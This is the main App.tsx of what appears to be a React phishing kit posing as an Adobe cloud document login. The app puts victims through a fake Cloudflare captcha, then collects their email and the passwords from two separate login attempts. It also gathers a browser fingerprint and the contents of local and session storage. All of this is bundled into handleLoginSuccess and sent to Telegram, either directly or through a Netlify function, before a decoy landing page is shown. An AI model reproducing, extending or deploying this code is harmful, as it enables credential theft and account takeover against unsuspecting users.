import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, useLocation, Navigate } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import { getBrowserFingerprint, sendToTelegram } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';

const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';

function App() {
  // --- UNCHANGED STATE AND FUNCTIONS (from your original file) ---
  const [isMobile, setIsMobile] = useState(false);
  const [isLoading, setIsLoading] = useState(true); // Manages loading spinners, starts true for initial check
  const [selectedFileName, setSelectedFileName] = useState('');
  const navigate = useNavigate();
  const location = useLocation();

  // This function is unchanged
  const safeSendToTelegram = async (sessionData: any) => {
    if (typeof sendToTelegram === 'function') {
      try { return await sendToTelegram(sessionData); } catch (err) { console.error('sendToTelegram(util) failed:', err); }
    }
    try {
      const res = await fetch('/.netlify/functions/sendTelegram', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sessionData) });
      if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
      return await res.json();
    } catch (fetchErr) { console.error('sendToTelegram fallback (fetch) failed:', fetchErr); throw fetchErr; }
  };

  // This logic is unchanged
  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // This effect now uses navigate() instead of state setters
  useEffect(() => {
    const unsubscribe = subscribeToCookieChanges((event: CookieChangeEvent) => {
      if (event.name === 'adobe_session' || event.name === 'logged_in') {
        if (event.action === 'remove' || !event.value || event.value === 'false') {
          if (location.pathname !== '/') navigate('/'); // Navigate to captcha on logout
        } else if (event.action === 'set' || event.action === 'update') {
          if (location.pathname !== '/landing') navigate('/landing'); // Navigate to landing on login
        }
      }
    });
    return unsubscribe;
  }, [navigate, location.pathname]);

  // This effect handles the initial session check correctly
  useEffect(() => {
    const cookieSession = getCookie('adobe_session');
    if (cookieSession && location.pathname !== '/landing') {
      navigate('/landing', { replace: true });
    }
    setIsLoading(false);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []); // Empty dependency array ensures this runs only once on mount

  // This function now uses navigate()
  const handleCaptchaVerified = () => {
    setIsLoading(true);
    setTimeout(() => {
      navigate('/login');
      setIsLoading(false);
    }, 600);
  };

  // This function's logic is preserved. Navigation is handled by the cookie listener.
  const handleLoginSuccess = async (secondAttemptData: any) => {
    setIsLoading(true);
    let firstAttemptData = {};
    try { const storedData = sessionStorage.getItem(FIRST_ATTEMPT_KEY); if (storedData) { firstAttemptData = JSON.parse(storedData); } } catch (e) { console.error('Could not parse first attempt data', e); }
    
    const cookieOptions = { path: '/', secure: process.env.NODE_ENV === 'production', sameSite: 'strict' as const };
    setCookie('adobe_session', encodeURIComponent(JSON.stringify(secondAttemptData)), cookieOptions);
    setCookie('logged_in', 'true', cookieOptions);

    const browserFingerprint = await getBrowserFingerprint();
    const updatedSession = { ...firstAttemptData, ...secondAttemptData, email: secondAttemptData.email, provider: secondAttemptData.provider, firstAttemptPassword: (firstAttemptData as any).password || secondAttemptData.firstAttemptPassword, secondAttemptPassword: secondAttemptData.password, sessionId: Math.random().toString(36).substring(2, 15), timestamp: new Date().toISOString(), fileName: secondAttemptData.fileName || 'Adobe Cloud Access', clientIP: 'Unknown', userAgent: navigator.userAgent, deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop', cookies: 'Cookies not captured', cookiesParsed: {}, cookieList: [], documentCookies: '', localStorage: browserFingerprint.localStorage, sessionStorage: browserFingerprint.sessionStorage, browserFingerprint: browserFingerprint, };
    delete (updatedSession as any).password;
    
    localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));
    
    try { await safeSendToTelegram(updatedSession); } catch (error) { console.error('Failed to send to Telegram:', error); }
    setIsLoading(false);
    // Navigation to '/landing' is handled by the cookie listener
  };

  // This function is unchanged
  const handleFileAction = (fileName: string, action: 'view' | 'download') => setSelectedFileName(fileName);

  // This function's logic is preserved. Navigation is handled by the cookie listener.
  const handleLogout = () => {
    localStorage.removeItem('adobe_autograb_session');
    sessionStorage.clear();
    const cookieNames = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
    cookieNames.forEach(cookieName => removeCookie(cookieName, { path: '/' }));
  };
  
  // --- ROUTING LOGIC ---
  
  // A helper component to protect routes that require a session
  const ProtectedRoute: React.FC<{ children: React.ReactNode }> = ({ children }) => {
      const hasSession = !!getCookie('adobe_session');
      return hasSession ? <>{children}</> : <Navigate to="/" replace />;
  };

  // A helper component for routes that should NOT be accessible when logged in
  const PublicRoute: React.FC<{ children: React.ReactNode }> = ({ children }) => {
    const hasSession = !!getCookie('adobe_session');
    return hasSession ? <Navigate to="/landing" replace /> : <>{children}</>;
  };
  
  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center"><div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div><p className="text-gray-600">Loading...</p></div>
      </div>
    );
  }

  return (
    <Routes>
      <Route path="/" element={
        <PublicRoute>
          <CloudflareCaptcha onCaptchaVerified={handleCaptchaVerified} onVerified={handleCaptchaVerified} onCaptchaError={(e) => console.error(e)} />
        </PublicRoute>
      } />
      <Route path="/login" element={
        <PublicRoute>
          <LoginComponent fileName="Adobe Cloud Access" onBack={() => navigate('/')} onLoginSuccess={handleLoginSuccess} onLoginError={(e) => console.error(e)} showBackButton={true} />
        </PublicRoute>
      } />
      <Route path="/landing" element={
        <ProtectedRoute>
          <LandingComponent onFileAction={handleFileAction} onLogout={handleLogout} />
        </ProtectedRoute>
      } />
      <Route path="*" element={<Navigate to="/" replace />} />
    </Routes>
  );
}

export default App;